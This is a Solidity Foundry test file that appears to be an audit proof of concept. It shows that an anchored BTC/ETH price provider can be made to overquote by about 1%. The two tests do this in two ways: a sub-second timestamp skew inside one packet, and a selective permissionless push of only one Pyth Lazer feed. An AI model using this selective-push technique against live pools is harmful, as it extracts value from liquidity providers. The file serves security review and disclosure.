// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {PythLazerStructs} from "pyth-lazer-sdk/PythLazerStructs.sol";

import {AnchoredPriceProvider} from "../contracts/AnchoredPriceProvider.sol";
import {PythOracle} from "../contracts/oracles/providers/PythOracle.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";

contract TimestampMismatchMockPythLazer {
    bytes public payload;

    function setPayload(bytes memory newPayload) external {
        payload = newPayload;
    }

    function verifyUpdate(bytes calldata) external payable returns (bytes memory, address) {
        return (payload, address(this));
    }
}

/// @notice Uses the real Lazer parser, providers oracle, and AnchoredPriceProvider. The mocked
///         verifier only replaces Pyth's signature verification; the payload bytes take the same
///         parsing and storage path as a verified Pyth Lazer packet.
contract AnchoredSyntheticTimestampMismatchPoC is Test {
    bytes4 internal constant FORMAT_MAGIC = 0x93c7d375;
    uint32 internal constant BTC_FEED_ID = 1;
    uint32 internal constant ETH_FEED_ID = 2;

    uint256 internal constant Q64 = 1 << 64;
    uint256 internal constant BTC_NOW = 65_000 * 1e8;
    uint256 internal constant BTC_LATER = 65_650 * 1e8;
    uint256 internal constant ETH_OLD = 3_000 * 1e8;
    uint256 internal constant ETH_NOW = 3_030 * 1e8;
    uint256 internal constant T0 = 1_700_000_000;

    address internal constant BTC = address(0xB7C);
    address internal constant ETH = address(0xE74);

    TimestampMismatchMockPythLazer internal lazer;
    PythOracle internal oracle;
    AnchoredPriceProvider internal provider;
    MockPoolFactory internal poolFactory;
    address internal inSwapProvider;

    function inSwap() external view returns (address) {
        return inSwapProvider;
    }

    function setUp() public {
        vm.warp(T0);

        lazer = new TimestampMismatchMockPythLazer();
        oracle = new PythOracle(address(this), address(lazer), 60, _expectedProperties());
        vm.deal(address(oracle), 1 ether);

        provider = new AnchoredPriceProvider(
            address(this),
            address(oracle),
            bytes32(uint256(BTC_FEED_ID)),
            bytes32(uint256(ETH_FEED_ID)),
            5e13, // 0.5 bps minimum margin
            60,
            300,
            false,
            0,
            BTC,
            ETH
        );

        poolFactory = new MockPoolFactory();
        poolFactory.setPool(address(this), true);
        oracle.addApprovedFactory(address(poolFactory));

        _pushSamePacketWithSubsecondSkew();
        oracle.register{value: 1}(bytes32(uint256(BTC_FEED_ID)), address(this), address(poolFactory));
        oracle.register{value: 1}(bytes32(uint256(ETH_FEED_ID)), address(this), address(poolFactory));
    }

    function test_samePacketSubsecondSkewIsCollapsedAndMispricesRatio() public {
        // BTC is observed 800 ms after ETH, but both timestamps floor to block.timestamp.
        // The provider discards even that per-leg timestamp and composes BTC(t1) / ETH(t0).
        inSwapProvider = address(provider);
        (uint128 bid,) = provider.getBidAndAskPrice();

        uint256 fairMid8 = Math.mulDiv(BTC_NOW, 1e8, ETH_NOW);
        uint256 fairMidX64 = Math.mulDiv(fairMid8, Q64, 1e8);

        assertGt(uint256(bid), fairMidX64, "mixed-time bid exceeds the coherent current mid");
        uint256 excessBps = (uint256(bid) - fairMidX64) * 10_000 / fairMidX64;
        assertGt(excessBps, 90, "approximately 1% can be extracted before pool fees/slippage");
    }

    function test_permissionlessSelectivePushMixesTwoCorrectObservations() public {
        // Both assets move 1% over a realistic 30-second interval, so their coherent
        // BTC/ETH ratio is unchanged. Pyth supports payloads for a caller-selected feed
        // list, and Metric accepts any verified subset, so only BTC is pushed on-chain.
        vm.warp(T0 + 30 seconds);
        uint64 updateTimestampUs = uint64(block.timestamp * 1_000_000 + 100_000);
        _pushSingleFeed(BTC_FEED_ID, int64(int256(BTC_LATER)), updateTimestampUs);

        // BTC(t1) and ETH(t0) are each genuine observations and both pass the provider's
        // 60-second staleness check. Their composition is nevertheless a price that never
        // existed: 65,650 / 3,000 instead of the coherent 65,650 / 3,030.
        inSwapProvider = address(provider);
        (uint128 mixedBid,) = provider.getBidAndAskPrice();
        uint256 coherentMid8 = Math.mulDiv(BTC_LATER, 1e8, ETH_NOW);
        uint256 coherentMidX64 = Math.mulDiv(coherentMid8, Q64, 1e8);
        uint256 excessBps = (uint256(mixedBid) - coherentMidX64) * 10_000 / coherentMidX64;

        emit log_named_uint("BTC leg age seconds", 0);
        emit log_named_uint("ETH leg age seconds", 29);
        emit log_named_uint("mixed-time quote excess bps", excessBps);

        assertGt(excessBps, 90, "selective valid update creates an approximately 1% ratio error");

        // Pushing the independently correct ETH observation restores temporal coherence.
        _pushSingleFeed(ETH_FEED_ID, int64(int256(ETH_NOW)), updateTimestampUs);
        (uint128 coherentBid,) = provider.getBidAndAskPrice();
        uint256 providerErrorBps = (uint256(mixedBid) - uint256(coherentBid)) * 10_000 / uint256(coherentBid);
        emit log_named_uint("mixed bid excess over repaired provider bid bps", providerErrorBps);
        assertGt(providerErrorBps, 95, "freshening both legs removes approximately 1% overquote");
        assertLt(uint256(coherentBid), coherentMidX64, "configured provider band keeps bid below mid");
        assertLt(
            coherentMidX64 - uint256(coherentBid), coherentMidX64 / 1_000, "repaired quote is close to coherent mid"
        );
    }

    function _pushSamePacketWithSubsecondSkew() internal {
        uint64 secondStartUs = uint64(block.timestamp * 1_000_000);
        uint64 btcTimestampUs = secondStartUs + 900_000;
        uint64 ethTimestampUs = secondStartUs + 100_000;

        bytes[] memory feeds = new bytes[](2);
        feeds[0] = _feed(BTC_FEED_ID, int64(int256(BTC_NOW)), btcTimestampUs);
        feeds[1] = _feed(ETH_FEED_ID, int64(int256(ETH_OLD)), ethTimestampUs);

        bytes memory payload = bytes.concat(
            abi.encodePacked(
                FORMAT_MAGIC, btcTimestampUs, uint8(PythLazerStructs.Channel.RealTime), uint8(feeds.length)
            ),
            feeds[0],
            feeds[1]
        );
        lazer.setPayload(payload);

        bytes memory updateCall = abi.encodePacked(uint16(2), BTC_FEED_ID, ETH_FEED_ID);
        (bool ok, bytes memory reason) = address(oracle).call(updateCall);
        if (!ok) {
            assembly ("memory-safe") {
                revert(add(reason, 0x20), mload(reason))
            }
        }
    }

    function _pushSingleFeed(uint32 feedId, int64 price, uint64 feedTimestampUs) internal {
        bytes memory payload = bytes.concat(
            abi.encodePacked(FORMAT_MAGIC, feedTimestampUs, uint8(PythLazerStructs.Channel.RealTime), uint8(1)),
            _feed(feedId, price, feedTimestampUs)
        );
        lazer.setPayload(payload);

        bytes memory updateCall = abi.encodePacked(uint16(1), feedId);
        (bool ok, bytes memory reason) = address(oracle).call(updateCall);
        if (!ok) {
            assembly ("memory-safe") {
                revert(add(reason, 0x20), mload(reason))
            }
        }
    }

    function _feed(uint32 feedId, int64 price, uint64 feedTimestampUs) internal pure returns (bytes memory) {
        return abi.encodePacked(
            feedId,
            uint8(4),
            uint8(0),
            bytes8(uint64(price)),
            uint8(4),
            bytes2(uint16(int16(-8))),
            uint8(5),
            bytes8(uint64(1)),
            uint8(12),
            uint8(1),
            bytes8(feedTimestampUs)
        );
    }

    function _expectedProperties() internal pure returns (uint8[] memory properties) {
        properties = new uint8[](4);
        properties[0] = 0;
        properties[1] = 4;
        properties[2] = 5;
        properties[3] = 12;
    }
}
